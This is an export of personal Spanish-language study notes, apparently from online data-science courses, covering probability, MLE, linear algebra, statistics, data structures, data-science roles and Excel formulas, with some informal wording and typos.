   → disjuntos: la probabilidad es la suma de cada evento

# Probabilidad en machine learning
- fuentes de incertidumbre:
   → datos, este es un proceso imperfecto, debido a los instrumentos que se usan
   → atributos del modelo, las variables preditores son un subconjunto reducido, lo que hace que halla mas incertidumbre
   → arquitectura del modelo, representación de la realidad
- modelo de clasificacion
   → entrenamiento
      ⇒ extractor de atributos
      ⇒ atributos
      ⇒ algoritmo de ML
   → prediccion
      ⇒ extractor de atributos
      ⇒ atributos
      ⇒ modelo de clasificacion
      ⇒ etiqueta
- etapas del modelo (no todos los modelos son probabilisticos):
   → arquitectura, que modelo se usa, si usa o no probabilidad
   → parametros, entrenamiendo, aprendiendo por la distribucion de probabilidad, MLE
   → calibracion, ajuste del modelo por medio de hiper parametros, esto pasa mucho en las redes neuronales donde uno modifica los pesos para que sea ams exacto
   → interpretacion de la prediccioón
   → resultado

# Tipos de probabilidad
- regla del producto: P(A,B) = P(A|B)P(B)
- marginal: P(A) = SUM_B(P(A,B))
- conjunta
   → cuando se calcula la probabilidad de dos o mas sucesos
   → se calcula con un conteo al espacio muestral
- marginal
   → solo la probabilidad de un suceso, sin importar otro suceso
- condicional
   → depende de que ya se tenga un condicion
   → esto nos reduce el espacio muestral
   → calculando el valor de la probabilidad condicional y multiplicandolo por la probabilidad nos dara la probabilidad conjunta, regla del producto

# Que es una distribución o una densidad
- es una funcion en el sentido del calculo que toma una variable aleatoria y a cada uno de sus posibles estados le asigna una probabilidad
- lineal = discreta
- P(X=x) -&gt; densidad de probabilidad
   → X -&gt; variable aleatoria
   → x -&gt; posibles valores
   → El domino son todos los valores posibles que puede tener la variables aleatoria
   → se dividen en dos:
      ⇒ funciones discretas, 1, 2, 3, 4, lanzar dado o una moneda, se pueden contar facilmente
      ⇒ funcion continuas, 0 a infinito, la temperatura, dentro de los numero reales
   → area bajo la curva, funcion de probabilidad acumulada
   → en discreatas esta dada mas por un diagrama de barras, histograma

# Distribuciones discretas
- Distribución de Bernoulli P(X=1) = p, P(X=0) = 1 - p
   → la suma de probabilidades debe de dar el 100%
   → ocurrencias binarias
   → se acompleja teniendo varias secuencias de eventos binarios -&gt; distribución binomial
   → combinatorio: (n k) = n! / k!(n-k)!
   → formula: p(k, n) = (n k) (p^k) * (1-p)^(n-k)
- otras distribuciones, Poisson, geométrica, hipergeométrica, binomial negativa
- multinomial es una distribucion donde se tiene mas de dos valores por ejemplo el caso de los dados

revisar el metodo binom (parece ser una clase)
algoritmos deterministicos aleatorios

# Distribuciones continuas
- data set seattlecentral
- distribucion nomal o gaussiana, e muy comun en los datos
- 
- otras:
   → exponencial
   → pareto

Estimar una distribucion
- ajustar una distribucion a un conjunto de datos, para poder hacer una prediccion
- se crea una hipotesis para poder saber que tipo de distribucion es
- no parametrica: no se forzan parametros de una funcion unica, son varias distribuciones, generalmente se combinan varias funciones, medoto de suavizado y funcion base
- funciones en sklearn: kernels (kernel density estimation)

# Que es MLE
- Estimación de máxima verosimilitud
- estimar densidades de probabilidad dentro de un esquema de trabajo muy general
- framework para estimacion de densidades de un cojuntos de datos:
   → escoger la distribucion, teniendo solo una muestra de los datos
   → escoger los parametros de la distribucion, que ajustan mejor la distribucion
- generalmente se tienen una distribucion mayor, pero en nuestro caso siempre tenemos una muestra de los datos
- es un problema de optimización
   → se tienen muchos datos que pueden variar la salida
   → se toma el valor mas probable que pueda pasar calcular los valores

# MLE en machine learning
- ajustar densidades a datos
- se ajustan densidades datos en ml
- aqui es donde se busca el modelo que nos va a ayudar para los datos
- regresion lineal con MLE:
   → se encuentra el modelo lineal
- los minimos cuadrados son un problema de MLE

# Regresion logistica
- problema de clasificacion binaria
- los resultados son de dos tipos en clasificacion binaria
- sigmoide: y = 1 / (1 + exp(-x))
- se pueden dar P con valores entre 0 y 1, usando los errores se arregla que nos de las categorias con las probabilidades mas altas
- distribucion bernoulli:
   → p = p x 1 + (1 - p) x 0
   → L = ŷ * y + (1 - ŷ) x (1 - y)
- cross entropy: CE = -(sum)y_i * log ŷ + (1 -y_i) * log (1 - ŷ)

# Teoria de Bayes
- refleja una filosofia diferente de los sucesos aleatorios
- P(A|B) -&gt; posteriori, cual es la probabilidad de que pase A dando los elementos de B
- P(B|A) -&gt; Verosimil, prueba de la evidencia de que pase A de acuerdo a B
- P(A) -&gt; priori, creencia inicial que se tiene, puede no ser la realidad
- P(B) -&gt; evidencia, esta es la realidad, modifica las probabilidades
- por lo tanto P(A|B) = (P(B|A)P(A)) / P(B)
- MAP sirve como MLE para bayesianos

# TEMAS A ESTUDIAR
La función de error que se usa en regresión logística se conoce como:
¿Qué son las funciones en programación?
Una distribuciÃ³n de probabilidad es:

</rich_text>
    </node>
    <node name="algebra lineal" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1622838312" ts_lastsave="1623196812">
      <rich_text># Las bases
- el tipo de datos se diferencia en los grados de libertad
- escalar es un numero, variables normales en python
- vector, es un lugar donde se colocan mucho numeros
- la matriz tiene dos grados de libertad, es la union de varios vectores
- el tensor tiene uno o mas grados de libertad que la matriz, se puede decir que son multiples matrices

# Propiedades de las matrices
- asociativo: Ax(BxC) = (AxB)xC
- distributivo: Ax(B+C) = (AxB)+(AxC)
- conmutatio: BxC = CxB, no lo es en matrices, en el caso de vectores si lo es
- (AB)^t = B^tA^t

# Que es combinacion lineal
- es multiplicar un vector por un escalar, otro vector por otro escalar y sumar el resultado para obtener un nuevo vector

# La norma
- La norma sirve para medir el tamaño de un vector, no puede ser negativo, queremos conocer el error al hacer las aproximaciones
- norma &gt;= 0
- la norma(v) = 0 ⇔ v = 0
- la deisgualdad triangular, es la suma de dos vectores, se calculan las nomas se puede decir que norm(v3) &lt;= norm(v1) + norm(v2)
- norm(a*v) = abs(a)*norm(v)
- la unica forma en que la norma de las sumas sea igual a la suma de las normas de cada vector es que ambos sean parte de si mismos

# Normas:
- L0: nos devuelve la cantidad de elementos distintos de cero
- L1: sum_i abs(vi)
- L2: es la distancia euclidiana entre dos puntos
- en ML se usa mucho el (L2)^2
- L_inf = max_i abs(v_i)

# Producto interno de dos vectores
- el producto interno de dos vectores es la norma de cada vector por el angulo que forman entre ellos

# matriz identidad
- es el elemento neutro del producto interno
- al multiplica A*A^1 = Id.
- la singular es aquella que no tiene matriz inversa
- al multiplicar la matriz lineal por un vector no hace una combinacion lineal de las distintas coordenadas, se dice que hace una ponderacion
- una matriz es simetrica, cuando su traspuesta es igual a la matriz A = A^t

# Vectores ortogonales
- para ser ortogonal es en referencia a otro vector
- el angulo que forman los dos vectores forman 90°
- ortonormal, cuando la norma de los vectores es 1
- se pueden volver ortonormales si se les divide por su norma

# matriz ortogonal
- es cuando todas sus filas y columnas con ortonormales
- los vectores que se forman en la matriz deben de ser ortogonales
- A^t*A = A*A^t = id -&gt; A^t = A^-1

# la traza y el determinante
- la traza nos devuelve el mismo numero independientemente de que sistema de referencia se utilice para representar la matriz
- traza(ABC) = traza(ACB) = traza(CBA)
- el determinante nos da el espejo del espacio</rich_text>
    </node>
    <node name="estadistica descriptiva" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1624149121" ts_lastsave="1653320979">
      <rich_text>- Curso para descifrar lo que es cierto y lo que no

# Que es estadistica descriptiva
- descriptiva: “resumir un historial deportivo”
   → como es un desempeño despues de varios partidos
   → se crean metricas resumidas... en este tipo de estadistica
- inferncial: predecir desempenio futuro del jugador
- basicamente es resumir la informacion
- como se define lo que es correcto o no, definición de metricas unicas
- maked statistics, Charles Wheelan
- se aprende por:
   → resumir grandes cantidades de informacion
   → tomar decisiones
   → responder preguntas con relevancia social
   → reconocer patrones en los datos
   → descubir neofitos

es mas comun que las primeras fases de la ciencia de datos se requiera mas de la estadistica descriptiva:
- tipos de datos, pipeline de procesamiento, analisis exploratorio, estadistica descriptiva, correlacion, reducciones de datos

Un analisis exploratorio es la base de la estadistica descriptiva, identificar correlacion, si se puede reducir el conjunto de datos

# Tipos de datos
- Categoricos (genero, categoria, metodos de pago), como tal no son números separan los datos en categorias
   → ordinal, existe una relacion de orden entre categorias
   → nominal, no existe una relacion
- Numericos (edad, altura, temperatura), son explicitamente numeros
   → discretos, generalmente la edad
   → continuos, la altura ya que es un poco mas flotante
- categoricos: object y bool, numericos: int64, float64
- medidas de tendencia central y de dispersion... TIPOS DE ESTADISTICOS DESCRIPTIVOS

# Medidas de tendencia central
- sirve para resumir información
- Media (promedio), dice una ubicacion del conjunto de datos
   → es susceptible a valores atípicos
- Mediana (dato central), ordenados del mayor al menor, es que este en medio es la Mediana, valor balanceado
- Moda (dato que mas se repite)
   → no aplica para datos numéricos continuos
- Se usa generalmente la tabla de frecuencias
- una tabla de frecuencias es para saber cada cuantas veces aparece un dato, que tan comun es
- la media es muy susceptible a valores atipicos
- la moda no aplica pada datos numericos continuos
- con longitud impar se puede obtener el valor de enmedio, pero cuando es par se calcula la mediana sacando el promedio de los dos valores de enmedio

# Medidas de dispersion
- son un complemento para las medidas de tendencia central
- Rango
   → valor minimo y maximo de un conjunto de datos
- Rango intercuartil
   → se basa en los cuartiles
   → se divide el conjunto de datos en 4 subdivisiones
   → Q2 es la mediana
   → Q1 esta entre la mediana y el minimo
   → Q3 esta entre la mediana y el maximo
   → la distancia entre el Q1 y el Q3 es el rango intercuartil
   → diagrama de caja sirve para visualizar los cuartiles
- Desviacion estandar
   → 
   → (punto - promedio)^2 -&gt; la suma de cada elemento entre su numero de elementos -&gt; es la varianza
   → la desviacion estandar es la raiz de la varianza
   → en el caso de que sea por medio de la muestra no se divide entre el numero de elementos sino de (numero de elementos - 1)
- Distribución normal
   → tiene forma de campana
   → el promedio mas/menos 3 veces la desviacion estandar es donde se encuentran la totalidad de todos los datos
   → identificacion de datos anomalos:
      ⇒ Q1 - 1.5 * IQR
      ⇒ Q3 + 1.5 * IQR
   → coinciden lo de la desviacion estandar con los cuartiles

# estadística en la ingesta de datos
- pipelines de procesamiento de datos numericos:
   → es muy necesario normalizarlos, por que los optimizadores son optimos mientras que todos los atributos que estan tienen las mismas magnitudes
   → escalamiento lineal o normalizar
      ⇒ se deben de usar entre el rango de -1, 1 (generalmente son mas eficientes los ML
      ⇒ los escalamientos se hacen cuando estan uniformemente distribuidos o tiene una distribucion simetrica
      ⇒ existen diferentes tipos (se usan dependiendo de lo que se esta tratando de hacer con el modelo)
         • max-min, se transforma a un valor normalizado donde se usa una transformacion para ir de un valor x (es el valor a transformar que se toma) a x_s, se puede defirnir como x_s = (2x - min - max) / (max - min)
         • clipping, se toma la distribucion y se corta entre los valores limite inferior y superior, descarta valores por eso no es muy usable, los que rebasan los valores superior e inferior se forzan a ser esos valores
         • z-score, es mas comun, esta basado en definicion de promedio y desviacion estandar, x_s = (x - prom) / desv. estandar
         • winsorizing, es como el clipping pero usando los quartiles
      ⇒ como usarlos:
         • data simetrica o uniformemente distribuida
- transformacion no lineal (se usa cuando no estan con distribuciones simetricas)
   → datos fuertemente sesgados, no simetricos
   → existen diferentes:
      ⇒ logaritmos
      ⇒ sigmoides
      ⇒ polinomiales
   → se usan antes de escalar linealmente
   → generalmente los datos dicen que tipo d etransformacion se requiere
   → generalmente los valores uniformemente distribuidos se usa max min y con la distribucion tipo Gauss se usa z-score
- Pipelines de procesamiento de datos categoricos
   → Dummy
      ⇒ representacion compacta
      ⇒ Mejor para inputs linealmente independientes
      ⇒ una correlacion no tan fuerte
      ⇒ cuando las categorias son independientes entre si
   → One-hot
      ⇒ para algo mas grande
      ⇒ permite describir categorias no incluidas inicialmente
      ⇒ no ordinales
      ⇒ son representaciones categoricas
   → ambos se deben de mapear manualmente las categorias de los valores
   → categorias no ordinales, no tienen un orden entre ellas
   → a veces se trata como Dummy y One Hot como lo mismo, aunque Dummy realemente no existe
- se pueden tratar variables numericas como categorias: si, depende del caso del uso
- Correlaciones:
   → cuando dos variables tienen un comportamiento identico se dice que estan correlacionadas
   → si tienen una correlacion muy alta es posible no incluirlas ya que pueden estar aportando la misma informacion
   → se puede reducir el número de variables
   → mide las desviaciones de una variable x con relacion a otra variable
- el coeficiente de correlacion
   → p = (cov) / (std(x) * std(y))
   → es la medida especifica que cuantifica la intensidad de la relacion lineal entre dos varibales en un analisis
   → es el coeficiente P
- la correlacion mide algo que puede ser casualidad que varie, al revisar el problema puede no ser causa-relación
- causasion no esta asociado con correlacion, correlacion no implica causasion
- matriz de covarianza:
   → cuando se obtienen todas las variables de covarianza entre ellas
   → muhas veces se tienen que normalizar los datos

# PCA
- anáisis de componentes principales
   → proyección(sombra) de un vector sobre otro
      ⇒ es que se proyecta sobre la superficie del segundo vector (como una sobra), se desea calcular solo la longitud que tiene sobre el vector
         • vec(a_p) = a_p vec(b) = ((vec(a) * vec(b)) / |vec(b)|) uni(b)
   → cada vector propio es una de las direcciones principales de la cual capturamos varianza de los datos originales
   → hay que revisar todo lo que tenga que ver con los eigen values y eigen vectores para poder hacer el PCA
   → al llegar a este punto generalmente es por que se piensa entrenar un modelo
   → generalmente esto se hace para crear nuevas variables</rich_text>
    </node>
    <node name="Estadistica inferencial" unique_id="98" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655388312" ts_lastsave="1655742204">
      <rich_text>Descriptiva, nos ayuda a decribir y entender los datos, como se estan comportando en el presente
	- como se comportan los datos, tendencia, variabilidad y distribucion
Inferencial, inducciones se predice, para validar teorias
	- la abstraccion, a partir de una poblacion se trae una muestra
	- Muestreo
	- intervalos de confianza, sacar conclusiones y deducciones
	- validacion de hipotesis, teorias que nos cuestionaremos y se deben demostrar
	- tecnicas para evitar sesgos
	- sacar conclusiones a partir de los parametros que se tienen de la poblacion
	- estudio del grado de fiabilidad
	- se sintetiza, para entender una distribucion de la informacion, creacion y validacion de hipotesis, creacion de experimentos y modelos predictivos, para llegar a conclusiones y ver si son precisos
	
Estadisticos principales
- experimento, procedimiento que puede pasar una, multiple o infinitas
   → se puede entontrar diferentes resultados
   → si es un resultado cambiante es aleatorio
   → si no se modifican en el tiempo, son deterministas
- poblacion y muestra
   → poblacion es el denominador, es algo grande
   → muestra, extraccion de los datos de poblacion
      ⇒ este debe de ser una muestra representativa, suficiente grande para sacar una conclusion, no estadisticamente significativo
      ⇒ elegir una poblacion sesgada, debe de adapatarse dentro de lo que se va a estudiar
- Evento, resultados finales, cada uno de los resultaos posibles
- variables, caracteristicas o atributos que se tienen de la poblacion o muestra
   → cualitativos, categoricos
   → cuantitativas
      ⇒ discretos, numero enteros
      ⇒ continuas, como le peso o altura
- Probabilidad, que tan probable es obtener un evento determinado
- probabilidad condicionada, teniendo un evento a y b, que tan probable es que pase algo tomando en cuenta el otro evento

Poblaciones normales
- se de las mas habituales
- es simetrica en x y y
- sigue una distribucion en campana
- casi siempre esta la mayor concentracion en la media
- se tiene la mayotia de la informacion en un punto centrico
- moda = media = mediana

Teorema Central del Limite
- muestras
   → son la extraccion de una poblacion
      ⇒ deben de ser lo suficientemente grande para sacar una conclusion
      ⇒ no debe de estar sesgada, debe de tener diferentes atributos
   → tipos
      ⇒ aleatorio simple, siempre tiene la misma posibilidad de ser elegidos
      ⇒ sistematico, sigue un intervalo, regla o condicion
      ⇒ estratificado, se hace un muestreo basado en una de las categorias o variables
- teorema del limite central
   → la mayoria de los eventos en el mundo se explican sobre una distribucion normal

La media muestral
- media, valor cual es el promedio, entre todas las observaciones, se puede usar en multiples contextos
- moda, es el dato que mas se repite, el mas frecuente
- mediana, es el valor que nos ayuda a dividir una distribucion entre dos
- que es la media muestral, es lo mismo que la media aritmetica, la media entre todas las observaciones, es basado en la muestra tomada de la poblacion

Varianza y desviacion estandar
- nos ayuda a calcular que tan dispersa esta la poblacion o muestra, con respecto a la media
- la desviacion estandar es la raiz cuadrada de la varianza

Intervalos de confianza
- son un par o varios pares de numeros donde se estima que estara cierto valor desconocido respecto de un parametro poblacional con un determinado nivel de confianza
- nos muestran cuales son las poblacion o concentracion de numeros y con que probabilidad lo tenemos
- un indice de confianza del 99% es muy estricto, o 68% que es tambien muy usado, tambien se usa el 95%, se comportan de una manera simtrica
-  nivel de significacion
   → donde se rechaza y donde no e rechaza la hipotesis nula
   → cual es el alpha con el cual se puede encontrar el limite donde un resultado es o no es estadisticamente significativo
   → cuando el valor es menor al indice de significacion, se acepta que es estadisticamente significativo
   → se explora que no halla una anomalia de diferencia
   → en los picos, se dice si si rechazar los dos parametros que son diferentes

Calculo de intervalo de confianza
- existen dos maneras
   → conociendo los datos de la distribucion
   → no conociendolos
- calculo con un 95% de certidumbre, la concentracion lo tiene, el 5% se distribuye entre izquierda y derecha
- tabla Z para indices de confianza, se busca el 97.5%
- se sabe que que tenemos una distribucion de media de 28 y su desviacion de 4, con un indice del 80% de confianza
   → formula de la z; Z = (x - mu) / desv, mu es el promedio de la poblacion
   → se toma el valor de z usando la tabla y buscando el valor mas cercano al porcentaje de confianza que queremos, en este caso es 90 ya que se toma 10% del inicio y el 80% de confianza

Prueba de Hipotesis
- prueba de significacion, si existe una diferencia significativa entre el tamanio de la muestra y el parametro general
- pasos a seguir:
   → Se establece una hipotesis nula (H0), y una hipotesis alternativa (H1)
   → seleccionar el nivel de significancia
   → seleccionar el estadistico de prueba
   → formular la relga de decision
   → interpretar los resultados y tomar una decision

Tipos de Pruebas de hipotesis
- Distribucion de t de Student, se usa para estimar una media poblacional normalmente distribuida a partir de una muestra pequenia que sigue una distribucion normal y de la de que desconocemos la desviacion estandar, se usa cuando la muestra es pequenia
- Coeficiente de pEarson, se usa para medir la dependencia lineal entre dos variables aleatorias cuantitativas
- Analisis de la varianza (ANOVA), se usa para comprobar las varianzas entre las medias o promedios de diferentes grupos

Errores tipicos
- Contexto
   → rechazar H0 si es verdadera, error de tipo 1, evasion (alpha)
   → no rechazar H0 cuando es false, error de tipo 2, betha

Bootstrapping
- metodo de remuestro sobre una poblacion pequenia, o en distribuciones muy sesgadas
- se obtienen varios remuestreos

Validacion cruzada
- se usa al final del analisis
- para demostrar que los datos de prueba son independientes de los datos de entrenamiento
- procedimiento
   → se dividen los datos de forma aleatoria en k grupos de tamanio similar
   → se usan k-1 grupos para entrenar el modelo y uno de ellos para validarlo
   → el proceso se repite k veces usando un grupo distinto como validacion en cada iteracion

¿Qué indica el valor de Z al calcular intervalos de confianza?
</rich_text>
    </node>
    <node name="estadistica computacional" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1626023332" ts_lastsave="1626023332"/>
    <node name="estructura de datos" unique_id="65" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1643578407" ts_lastsave="1643578415">
      <node name="lineales" unique_id="66" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1643578415" ts_lastsave="1643830110">
        <rich_text># Arrays
- representacion interna de una coleccion de informacion
- caracteristicas
   → elemento, valor almacenado
   → indice, referencia a la posicion de diche elemento
- se usan debido a que guardan informacion de manera consecutiva, las listas de python crecen de manera dinamica
- generalmente tiene una capacidad
- existen de 1, 2 y 3 dimensiones, en python se recomienda no usar mas de 2 dimensiones
- los arrays son un tipo de lista
- no se pueden agregar o remover posiciones, tamaño fijo
- uso:
   → generalmente se usan en sprites de videojuegos
   → opciones en un menu
- python si cuenta con un modulo array

# Nodos y singly linked list
- consisten en nodos conectados unos a otros
- sencillas o dobles
- no se accede por indice sino por recorrido
- conceptos:
   → data, valor que se alverga
   → next referencia al siguiente nodo
   → previuos referencia al nodo anterior
   → head, primer nodo en la lista
   → tail, ultimo nodo
- los nodos se reparten en la memoria
- se usan los nodos para conectarse a otro nodo
- para creacion de estructuras mas complejas
- se usan para la optimizacion
- en las linked list no se tiene indices, se tienen que emular

# stacks
- conocidos como pilas
- basados en arrays o en link lists
- son LIFOS
- push, pop, top y bottom son sus metodos
- un stack y una lista son similares pero no lo mismo, las listas se ven afectadas por sus metodos

# queues
- FIFOs
- Rear ultimo elemento
- Front primer elemento
- Priority queues, se basa en FIFOs con elementos de menor o mayor prioridad
- pop
- add


errores
Son las dos principales categorÃ­as de estructuras de datos:
¿Qué métodos debe tener un array al crearse?
¿Qué escenarios debemos considerar en los métodos para añadir y/o eliminar nodos en una linked list?
En general, ¿qué se necesita para realizar operaciones como insertar o eliminar nodos de una linked list?
</rich_text>
      </node>
    </node>
    <node name="por que aprender CDD" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1647208030" ts_lastsave="1647813119">
      <rich_text>que es data science:
- es un proceso de descubrir infromacion valiosa de los datos
- para tomar decisiones y crear estrategias
- Crear productos basadps en inteligencia artificial
- es un conjkuntos de pasos
   → obtener datos
   → transformar y limpiar datos
   → explorar, analizar y visualizar datos
   → usar modelos de mchine learning
   → integrar datos e IA a productos de SF
- es una interseccion de conocimientos
   → mates
   → ciencias computacionales
   → conocimiento del dominio

Que es inteligencia artificil?
- va mas alla del analisis y manipulacion de datos
- algoritmos para emular nuestra inteligencia natural
- reconocer patrones en grandes cantidades de datos
- generalmente solo tienen una funcion
- se usa generalmente m,achine learning
- se debn separar en datos de entrenamiento y de entrada, no pueden ser iguales
   → aprende con los datos ded entrenamiento
   → ya una vez hecho el algoritmo se le dan los datos de entrada
   → se crea una prediccion
- es una herramienta para el data science

Que es big data?
- grnades volumenes de datos, variados y veloces
- resulta complicado procesarlos con metodos tradicionales
- caracteristicas
   → volumen, muchos datos
   → velocidad, se procesan en tiempo real
   → variedad, es de todo tipo de datos, estructurados y no estructurados
   → veracidad, calidad y confibles
   → valor, deben dar un valor a la empresa
- se procesa al dividirla en partes pequenias
- tecnologias como spacrk o hadoop
- es un tipo de materia prima para data science

que no es?
- magia
- inteligencia artificial
- tener solamente metricas de algun dato sin hallazgos de valor
- tampoco son puras matematicas
- trabajar solo con big data
- por que no aprender
   → no quieres aprender constantemente
   → no disfrutas el trabajo sucio
   → no te gusta comunicar y negociar
   → no te sientes motivado por ayudar a otras personas
   → no te gusta hacer que las cosas pasen

areas de aplicacion
- machine learning
- deep learning
- RPA, automatizacion de procesos
- vision artificial
- procesamiento de lenguaje natural
- robotica
- areas
   → salud
   → procesos productivos
   → procesos comerciales
   → redes sociales

Roles
- data scientist
- data analyst
- data engineer
- machine learning engineer

Data Analyst
- utiliza los datos para obtener insights, informacion de valor que permite y ayuda para la decision de toma de valores
- extrae, analiza y reporta algo amigable para la gente de negocio
- tiene mas contacto con las demas areas de la empresa
- uso de sql y python
   → limpiar y organizar datos
   → analizar datos para identificar patrones y tendencias
   → se deben comunicar a las personas de negocios, por medio de visualizaciones
- bussiness analyst
   → tiene un conocimiento mas profundo del negocio y tiene ma comunicacion con la otras areas
- data visualization specialist
   → son especialistas en como mostras las metricas en tableros
- Herramientas y tecnologias
   → consultas a bases de datos, SQL
   → software de visualizacion de datos, power bi y tableu
   → excel y google sheets
   → usar R o Python
   → usar jupyter notebooks
   → pandas, numpy y matplotlib
   → uso de matematicas, probabilidad y estadistica descriptiva
   → saber como las organizacion usan los datos
   → consultas en SQL
   → herramientas de analisis y visualizacion
   → estadistica aplicada a analisis de datos

Data scientists
- toma datos de diversas fuentes, y los usa para crear modelos de ML para encontrar informacion valiosa
- se tomen decisiones basadas en datos
- incorpora datos al software
- obtiene limpia y procesa datos
- dise;a y utiliza modelos de ML para generar predicciones de los datos
- monitea la precision de los modelos y de los datos
- automatiza los procesos de recoleccion y limpieza de datos
- crear reportes de informacion
- incorpora datos a los productos
- programacion avanzada con POO
- machine learning y estadistica avanzada
- herramientas y tecnologias
   → programacion con python o R
   → jupyter notebooks
   → pandas numpy y matplotlib
   → algoritmos y librerias de ml como scikit-learn y tensorflow
   → bases de SQL y NoSQL
   → mates
      ⇒ algebra
      ⇒ estadistica descriptiva e inferencial
      ⇒ probabilidad
      ⇒ algebra lineal
      ⇒ calculo
- como empezar
   → como se usan los datos en las organizaciones
   → programacion con python
   → jupyters
   → estadistica y probabilidad aplicada a data science

Data engineer
- toma datos crudos y crea datos limpios para analisis
- trabaja para que el equipo tenga datos para analisis
- crea pipelines ETL
- data pipelines de ETL y bases ded datos
- extrae datos de diferentes fuentes
- transforma datos y los almacena en bases de datos para analisis
   → bases OLTP
- se usan bases de datos OLAP, especializadas
- crear las automatizaciones
- variaciones
   → data architect
   → big data architect
- herramientas y tecnologias
   → programacion con python y bases de ingenieria de software, scala
   → linux
   → automatizacion y scripting
   → jupyter notebook
   → manejo avanzado de bases de datos SQL y NoSQL
   → pandas, dask y apache spark
   → airflow
   → tecnologias cloud
   → contenedores docker
   → orquestadores kubernetes
   → mates
      ⇒ estadistica descriptiva

Machine learning engineer
- recibe el modelo que viene desde el DS y lo pone en produccion
- crear productos basados en IA
- escala los modelos
- generar una evaluacion extensiva de metricas de los ML
- contruye, escala y robustece sistemas de ML que funcionen en prod
- colaborar con los DS y otros areas de SF
- monitoreo del desempenio y funcionalidad de los sistemas de ML
- herramientas y tecnologias
   → programacion avanzada con python, java, C++
   → bases solidas de ingeniera de software, conocimiento de devops y backend
   → pandas, numpy, matplotlib
   → frameworks y librerias de ML, tensorflow, keras, SKlearn
   → despliegue de modelos
      ⇒ flask, fastapi
      ⇒ tecnologias cloud
      ⇒ contenedores
      ⇒ kubernetes
   → mates
      ⇒ estadistica descriptiva e inferencial
      ⇒ probabilidad
      ⇒ algebra lineal
      ⇒ calculo

Soft skills
- ingles
- comunicacion y storytelling
- desarrollo de pensamiento critico, solicitudes sin impacto en el negocio
- creatividad
- hacer que las cosas pasen y tomar la responsabilidad
- trabajo en equipo
- curiosidad</rich_text>
    </node>
    <node name="excel" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1650833576" ts_lastsave="1651240815">
      <rich_text>Consulta de informacion
- BuscarV
   → informacion incompleta
   → contrastacion de hojas y libros diferentes
   → tener todo en una “base de datos”
   → evitar busqueda manual
   → evita buscar manualmente e inserta a la base central
   → formula =buscarv("celda o valor";"[file]hoja'celdas'";"columna donde esta la informacion";0(coincidencia exacta))
   → en ingles:  VLOOKUP
- valores absolutos y relativos en formulas
   → F2 para mostrar la formula
   → se mueve en la forma de una celda a la otra, por que los mueve en secuencia
   → se cambia en la columna donde esta el data
   → se pueden fijar en excel las columnas
   → se va a la formula y se fija con $ para fijar solo las filas
   → si se pone $A$2 no se movera el valor para ninguno de los datos
   → se aniade una fila en la parte superior, esto como tip, se pone el numero de la columna a buscar, se cambia el numero hardcode por el numero que debe tomar en la celda de arriba, se tiene que fijar la columna de los numeros con E$1 (respectivamente)
   → $let$num fija columnda y fila
   → $letnum fija la columna
   → let$num fija la fila
- checar orders_has_products, order, product, product_sold_vendor
- BuscarH
   → nombre_provedor, vendor.txt
   → se modifica con T
   → =buscarh("celda o valor";"[file]hoja'celdas'";"columna donde esta la informacion";0(coincidencia exacta))
- copiar sin formulas (revisar en calc)
- cambiar las fechas de formato
- resta de fechas
- resta de fecha de hoy a cuando llego, en dias
- reemplazo de texto

- listas desplegables
   → psara hacerlas se tiene que crear una lista en otro hoja y desde datos traerla
   → se pueden tener unos estados con dependencia de otra
   → checar como se hacen listas en calc y listas dependientes

- Separar texto y juntarlo
   → MES() -&gt; MONTH() para obtener datos de fecha (mes)
   → en datos, texto en columnas para separar el texto, se tiene que poner cual es el separador
   → para concatenar, formula contatenar
   → para obtener un slice, DERECHA(col, #Chars) o IZQUIERDA

- Formulas Basicas
   → sumar -&gt; suma
   → promedio -&gt; promedio
   → contar -&gt; contar

- mas formulas
   → de manera relativa a los datos
   → aleatorio para crear un numero aleatorio
   → SUMAR.SI, (rango del criterio, “criterio”, rango de suma)
   → PROMEDIO.SI, trabaja igual
   → CONTAR.SI, same, el rango a contar es el del criterio

Nombrar rangos y ahcer operaciones
- se pueden nombrar rango para simplificar formulas, se seniala y se cambia el nombre en el cuadro de nombres

Promedios ponderados
- valor por el peso y sumar
- sumaproducto

las formulas condicionales trabajan como un if ternario
se pueden agregar formato de colores a las columnas con condicionales

- tablas dinamicas
   → se pueden incluir campos desde la tabla source
   → en las tablas dinamicas en medio se ponen valores con los que se pueden operar, ventas, ganancias
   → cada campo se puede modificar la operacion, por ejemplo por default se suma, pero se puede cambiar a saber cuantos fueron
   → se pueden hacer calculos con los datos que estan dentro de la tabla, esto para tablas dinamicas
- graficas
   → se usan para tener un mensaje mas claro
   → datos procesados y agrupado, tiene que ser lo mas especifico y claro posible
- minigraficas
   → minis en 3.6.5

- se peuden bloquear y proteger las hojas, se hacen por medio de password
- tambien se puede proteger el libro
- se puede mostrar informacion de manera interactiva tambien


La utilidad principal de Excel es:
Dos de las malas pr├ícticas al trabajar con bases de datos son:
Una técnica efectiva y rápida para verificar la efectividad de las funciones relativas es:
El uso principal de los semáforos en Excel es dar diseño y armonía a la base de datos.
</rich_text>
    </node>
    <node name="notebooks" unique_id="76" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1650904726" ts_lastsave="1650928253">
      <rich_text>se pueded programar:
- en local
- en web broser
- en servidor
- en celular

Colab:
- tiempos de ejecucion y escalabilidad es uno de los temas mas importantes por los cuales usar nube
- servicio en la nube
- basado en jupyter notebooks
- no requiere configuracion
- trabajo a nivel de archivo
- uso gratuito de GPU y TPU

